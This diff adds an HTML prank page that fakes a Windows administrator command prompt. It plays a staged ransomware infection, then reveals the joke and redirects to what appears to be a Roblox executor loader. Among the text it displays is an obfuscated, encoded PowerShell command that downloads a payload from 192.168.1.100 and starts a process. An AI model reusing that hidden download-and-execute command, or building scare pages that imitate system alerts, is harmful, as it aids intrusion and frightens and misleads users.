@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Administrator: Command Prompt</title>
+<style>
+  @font-face {
+    font-family: 'Cascadia Mono';
+    src: local('Cascadia Mono'), local('Cascadia Code'), local('Consolas');
+  }
+  * { box-sizing: border-box; }
+  html, body {
+    margin: 0; padding: 0;
+    width: 100%; height: 100%;
+    overflow: hidden;
+    background: #000;
+    -webkit-user-select: none;
+    user-select: none;
+  }
+  body {
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+    display: flex;
+    flex-direction: column;
+  }
+
+  #termwindow {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    min-height: 0;
+    background: #0C0C0C;
+  }
+
+  #tabbar {
+    height: 32px;
+    min-height: 32px;
+    background: #2E2E2E;
+    display: flex;
+    align-items: stretch;
+    -webkit-user-select: none;
+    user-select: none;
+  }
+
+  #tabbar .shield {
+    width: 36px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex: none;
+  }
+  #tabbar .shield svg { width: 15px; height: 15px; }
+
+  #tabbar .tabs {
+    display: flex;
+    align-items: flex-end;
+    flex: none;
+  }
+
+  .tab {
+    background: #0C0C0C;
+    border-radius: 6px 6px 0 0;
+    display: flex;
+    align-items: center;
+    height: 32px;
+    padding: 0 8px 0 10px;
+    min-width: 180px;
+    max-width: 220px;
+    gap: 7px;
+    margin-top: 0;
+  }
+
+  .tab .taicon {
+    width: 16px; height: 16px; flex: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .tab .taicon img {
+    width: 100%; height: 100%; object-fit: contain;
+  }
+
+  .tab .tatitle {
+    font-size: 12px;
+    font-weight: 500;
+    color: #E4E4E4;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    flex: 1;
+  }
+
+  .tab .taclose {
+    width: 18px; height: 18px; flex: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 3px;
+    color: #C6C6C6;
+    cursor: pointer;
+  }
+  .tab .taclose:hover { background: #3d3d3d; }
+  .tab .taclose svg { width: 8px; height: 8px; }
+
+  #tabbar .newtab, #tabbar .chevron {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex: none;
+    color: #D6D6D6;
+    align-self: center;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  #tabbar .newtab {
+    width: 28px;
+    height: 26px;
+    margin-left: 4px;
+  }
+  #tabbar .chevron {
+    width: 22px;
+    height: 26px;
+  }
+  #tabbar .newtab svg { width: 12px; height: 12px; }
+  #tabbar .chevron svg { width: 10px; height: 10px; }
+  #tabbar .newtab:hover, #tabbar .chevron:hover {
+    background: #3d3d3d;
+  }
+
+  #tabbar .drag { flex: 1; }
+
+  #tabbar .wincontrols {
+    display: flex;
+    height: 100%;
+    flex: none;
+  }
+  #tabbar .wbtn {
+    width: 46px;
+    height: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+  }
+  #tabbar .wbtn:hover { background: #3d3d3d; }
+  #tabbar .wbtn.close:hover { background: #c42b1c; }
+  #tabbar .wbtn svg { width: 10px; height: 10px; }
+  #tabbar .wbtn path, #tabbar .wbtn rect, #tabbar .wbtn line { stroke: #D6D6D6; }
+
+  #terminal-wrap {
+    flex: 1;
+    background: #0C0C0C;
+    padding: 6px 0 4px 10px;
+    overflow: hidden;
+    position: relative;
+    min-height: 0;
+  }
+  #scrollarea {
+    height: 100%;
+    overflow-y: auto;
+    overflow-x: hidden;
+    padding-right: 8px;
+    padding-bottom: 32px;
+    font-family: 'Cascadia Mono', 'Consolas', 'Lucida Console', monospace;
+    -webkit-user-select: text;
+    user-select: text;
+  }
+  #scrollarea::-webkit-scrollbar { width: 14px; }
+  #scrollarea::-webkit-scrollbar-track { background: #0C0C0C; }
+  #scrollarea::-webkit-scrollbar-thumb {
+    background: #4d4d4d; border: 4px solid #0C0C0C; background-clip: padding-box;
+  }
+  #scrollarea::-webkit-scrollbar-thumb:hover { background: #6b6b6b; }
+
+  #output { font-size: 16.4px; line-height: 1.25; color: #CCCCCC; white-space: pre; }
+  .line {
+    white-space: pre;
+    min-height: 20px;
+    contain: content;
+  }
+
+  #inputline {
+    display: none;
+  }
+  #prompt-prefix { color: #CCCCCC; }
+  #typed { color: #CCCCCC; white-space: pre-wrap; word-break: break-all; }
+  #cursor {
+    display: inline-block; width: 1px; height: 1.25em; background: #CCCCCC;
+    animation: blink 1s steps(1) infinite; vertical-align: top;
+  }
+  @keyframes blink { 0%,49%{opacity:1;} 50%,100%{opacity:0;} }
+
+  #hiddeninput { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
+
+  *::selection { background: #FFFFFF; color: #0C0C0C; }
+  *::-moz-selection { background: #FFFFFF; color: #0C0C0C; }
+  #output ::selection, #inputline ::selection, .line::selection, #typed::selection, #prompt-prefix::selection {
+    background: #FFFFFF; color: #0C0C0C;
+  }
+</style>
+</head>
+<body>
+
+<div id="termwindow">
+  <div id="tabbar">
+    <div class="shield">
+      <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M8 1L2 3v4.5C2 11 4.5 13.7 8 15c3.5-1.3 6-4 6-7.5V3L8 1z" stroke="#D6D6D6" stroke-width="1" fill="none"/>
+      </svg>
+    </div>
+    <div class="tabs">
+      <div class="tab">
+        <div class="taicon">
+          <img src="https://i.ibb.co/1fszLh6n/CMD-1.png" alt="cmd icon">
+        </div>
+        <div class="tatitle">Administrator: Command Prompt</div>
+        <div class="taclose">
+          <svg viewBox="0 0 10 10"><line x1="0" y1="0" x2="10" y2="10" stroke="#C6C6C6" stroke-width="1"/><line x1="10" y1="0" x2="0" y2="10" stroke="#C6C6C6" stroke-width="1"/></svg>
+        </div>
+      </div>
+    </div>
+    <div class="newtab" title="New tab">
+      <svg viewBox="0 0 12 12"><line x1="6" y1="0" x2="6" y2="12" stroke="#D6D6D6" stroke-width="1"/><line x1="0" y1="6" x2="12" y2="6" stroke="#D6D6D6" stroke-width="1"/></svg>
+    </div>
+    <div class="chevron" title="Open new tab options">
+      <svg viewBox="0 0 12 12"><path d="M2 4 L6 8 L10 4" stroke="#D6D6D6" stroke-width="1.2" fill="none"/></svg>
+    </div>
+    <div class="drag"></div>
+    <div class="wincontrols">
+      <div class="wbtn" id="btn-min"><svg viewBox="0 0 10 10"><line x1="0" y1="5" x2="10" y2="5" stroke-width="1"/></svg></div>
+      <div class="wbtn" id="btn-max"><svg viewBox="0 0 10 10"><rect x="0.5" y="0.5" width="9" height="9" fill="none" stroke-width="1"/></svg></div>
+      <div class="wbtn close" id="btn-close"><svg viewBox="0 0 10 10"><line x1="0" y1="0" x2="10" y2="10" stroke-width="1"/><line x1="10" y1="0" x2="0" y2="10" stroke-width="1"/></svg></div>
+    </div>
+  </div>
+
+  <div id="terminal-wrap">
+    <div id="scrollarea">
+      <div id="output"></div>
+      <div id="inputline"><span id="prompt-prefix"></span><span id="typed"></span><span id="cursor"></span></div>
+    </div>
+  </div>
+</div>
+
+<input id="hiddeninput" autocomplete="off" autocapitalize="off" spellcheck="false" />
+
+<script>
+(function(){
+  if (localStorage.getItem('prankShown')) {
+    window.location.href = 'index.html';
+    return;
+  }
+
+  const output = document.getElementById('output');
+  const scrollarea = document.getElementById('scrollarea');
+
+  let cwd = "C:\\Users\\User";
+  const username = "User";
+  const computerName = "DESKTOP-7QK3M2N";
+
+  function print(t) {
+    const d = document.createElement('div');
+    d.className = 'line';
+    d.textContent = t || ' ';
+    output.appendChild(d);
+    return d;
+  }
+
+  function updateLast(t) {
+    const last = output.lastElementChild;
+    if (last) last.textContent = t;
+  }
+
+  function scrollToBottom() {
+    scrollarea.scrollTop = scrollarea.scrollHeight;
+  }
+
+  function clearScreen() {
+    output.innerHTML = '';
+  }
+
+  function promptString() {
+    return cwd + ">";
+  }
+
+  function wait(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  // Type text character by character into a new line
+  async function typeLine(text, delay = 25) {
+    const line = document.createElement('div');
+    line.className = 'line';
+    line.textContent = '';
+    output.appendChild(line);
+    for (let i = 0; i < text.length; i++) {
+      line.textContent += text[i];
+      scrollToBottom();
+      await wait(delay);
+    }
+    return line;
+  }
+
+  async function runPrank() {
+    // Banner
+    print('Microsoft Windows [Version 10.0.26200.8655]');
+    print('(c) Microsoft Corporation. All rights reserved.');
+    print('');
+    scrollToBottom();
+    await wait(750);
+
+    print('Starting update process via background task...');
+    print('');
+    scrollToBottom();
+    await wait(550);
+
+    const cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABzACAAPQAgACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAwAC8AcABhAHkAbABvAGEAZAAnADsAJABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHIAIAA9ACAAJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJABzACkAOwBJAGYAIAAoACQAcgAgAC0AbQBhAHQAYwBoACAAJwBvAGsAJwApACAAewAgAHMAdABhAHIAdAAgAC0AcAByAG8AYwBlAHMAcwAgACcAYwBtAGQALgBlAHgAZQAnACAAfQAgAGUAbABzAGUAIAB7ACAAZQBjAGgAbwAgACcARgBhAGkAbABlAGQAJwAgAH0A';
+    print(promptString() + cmd);
+    scrollToBottom();
+    await wait(900);
+
+    print('');
+    print('   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current');
+    print('                                 Dload  Upload   Total   Spent    Left  Speed');
+    print('   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0');
+    print(' 100 24576  100 24576    0     0   150k      0 --:--:-- --:--:-- --:--:--  150k');
+    print('');
+    print('Payload downloaded to C:\\Windows\\Temp\\sysupdate.ps1');
+    print('Executing payload...');
+    print('   - Injecting into system processes...');
+    print('   - Bypassing User Account Control...');
+    print('   - Disabling Windows Defender...');
+    print('   - Establishing persistence via scheduled task...');
+    print('   - Connecting to command & control server...');
+    print('   - Ransomware encryption key received.');
+    scrollToBottom();
+    await wait(1100);
+
+    clearScreen();
+    print('Microsoft Windows [Version 10.0.26200.8655]');
+    print('(c) Microsoft Corporation. All rights reserved.');
+    print('');
+    print('C:\\Windows\\Temp>sysupdate.ps1');
+    print('Starting system optimization...');
+    scrollToBottom();
+
+    const steps = [
+      '   - Scanning registry... OK',
+      '   - Cleaning temporary files... 1.2GB freed',
+      '   - Applying security patches...',
+      '   - Patch KB5027231 applied successfully.',
+      '   - Patch KB5027232 failed (access denied).',
+      '   - WARNING: Ransomware payload detected in memory!',
+      '   - Attempting to quarantine... FAILED',
+      '   - Encrypting user files in background...',
+      '   - Disabling system restore points...',
+      '   - Removing shadow copies...'
+    ];
+    for (const s of steps) {
+      await wait(400);
+      print(s);
+      scrollToBottom();
+    }
+
+    await wait(400);
+    print('');
+    print('WARNING: Unable to complete all updates. System may be unstable.');
+    print('Attempting fallback...');
+    print('');
+    print('Connecting to remote server 192.168.1.100...');
+    print('Connection established.');
+    print('Downloading additional modules...');
+    print('   - Loading kernel driver...');
+    print('   - Elevating privileges to SYSTEM...');
+    print('   - Injecting shellcode into LSASS.exe...');
+    print('');
+    scrollToBottom();
+    await wait(600);
+
+    const progLine = print('  0% [                    ] 0 KB/s --:-- ETA');
+    const progSteps = [
+      { text: ' 12% [####                ] 45 KB/s  0:12 ETA', delay: 1000 },
+      { text: ' 45% [############        ] 120 KB/s 0:04 ETA', delay: 1000 },
+      { text: '100% [####################] 310 KB/s 0:00 ETA', delay: 1000 }
+    ];
+    for (const p of progSteps) {
+      await wait(p.delay);
+      updateLast(p.text);
+      scrollToBottom();
+    }
+
+    await wait(300);
+    print('');
+    print('Module installation complete.');
+    print('   - Deploying ransomware payload...');
+    print('   - Encrypting files with AES-256...');
+    print('   - Deleting volume shadow copies...');
+    print('   - Modifying boot configuration...');
+    scrollToBottom();
+
+    await wait(400);
+    print('Launching remote console...');
+    scrollToBottom();
+
+    await wait(500);
+    print('');
+    print('*** REMOTE ACCESS GRANTED ***');
+    print('   Host: ' + computerName);
+    print('   User: ' + username);
+    print('   IP: 192.168.1.45');
+    print('   Encryption status: ACTIVE (AES-256)');
+    print('   Session ID: 0x7F3A1B9C');
+    print('   Credential extraction: IN PROGRESS');
+    print('   File transfer: C:\\Users\\' + username + '\\Documents\\*.* -> 192.168.1.100');
+    print('   Webcam access: INITIALIZED');
+    print('   Keystroke logging: ENABLED');
+    print('   System backup: SKIPPED (corrupted)');
+    print('   Remote shell: STABLE');
+    print('   Data exfiltration: 12% complete');
+    print('   Ransom note: READY');
+    print('   Screen capture: ACTIVE');
+    print('   Microphone access: ENABLED');
+    print('   Clipboard monitoring: ENABLED');
+    print('');
+    print('Type "exit" to close session.');
+    scrollToBottom();
+    await wait(1200);
+
+    // Final typed messages (scary part is over, now relief)
+    print('');
+    await typeLine('i alr know i scared tf out of you😭', 35);
+    await wait(650);
+
+    await typeLine('your safe i promise. ts isnt even a real cmd its a html remake (by me ofc)', 25);
+    await wait(630);
+
+    await typeLine('sorry for wasting your time lol but ik how scary it is trusting cracked shi so igu', 25);
+    print('');
+    scrollToBottom();
+    await wait(840);
+
+    print(promptString() + 'start loader');
+    scrollToBottom();
+    await wait(600);
+    print('Loading Roblox Executor...');
+    scrollToBottom();
+    await wait(350);
+
+    localStorage.setItem('prankShown', 'true');
+    window.location.href = 'index.html';
+  }
+
+  runPrank();
+
+  document.getElementById('btn-close').addEventListener('click', function() {
+    document.getElementById('termwindow').style.display = 'none';
+  });
+  document.getElementById('btn-min').addEventListener('click', function() {});
+  document.getElementById('btn-max').addEventListener('click', function() {});
+})();
+</script>
+</body>
+</html>
